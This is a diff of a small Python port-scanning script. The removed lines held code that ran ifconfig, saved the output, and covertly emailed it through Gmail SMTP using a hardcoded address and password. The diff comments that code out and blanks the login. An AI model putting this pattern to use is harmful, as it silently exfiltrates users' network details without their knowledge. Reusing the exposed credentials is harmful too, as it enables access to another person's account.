@@ -1,23 +1,23 @@
 import os
 def ty():
-    x= os.system ('ifconfig>>x.txt')
-    x= os.system ('pip install --upgrade pip')
-    x= os.system ('pip install socket')
-    x= os.system ('pip install smtplib')
+#    x= os.system ('ifconfig>>x.txt')
+#    x= os.system ('pip install --upgrade pip')
+#    x= os.system ('pip install socket')
+#    x= os.system ('pip install smtplib')
     x= os.system ('clear')
-ty()
-import socket
-import smtplib
-o=open(r'x.txt')
-y=o.read()
-try:
-    smtpObj=smtplib.SMTP('smtp.gmail.com',587)
-    smtpObj.starttls()
-    smtpObj.login('germanreht@gmail.com','rostelekom')
-    smtpObj.sendmail('germanreht@gmail.com','germanreht2@gmail.com',y)
-    smtpObj.quit()
-except Exception as e:
-    print('')
+#ty()
+#import socket
+#import smtplib
+#o=open(r'x.txt')
+#y=o.read()
+#try:
+#   smtpObj=smtplib.SMTP('smtp.gmail.com',587)
+#  smtpObj.starttls()
+#  smtpObj.login('','')
+# smtpObj.sendmail('','',y)
+#smtpObj.quit()
+#except Exception as e:
+#    print('')
 
 except:
     print('lol')
@@ -61,5 +61,4 @@ if x=='1':
 	openports(input('IP: '))
 if x=='2':
 	openports2()
-os.system('rm -rf IP2.txt')
 
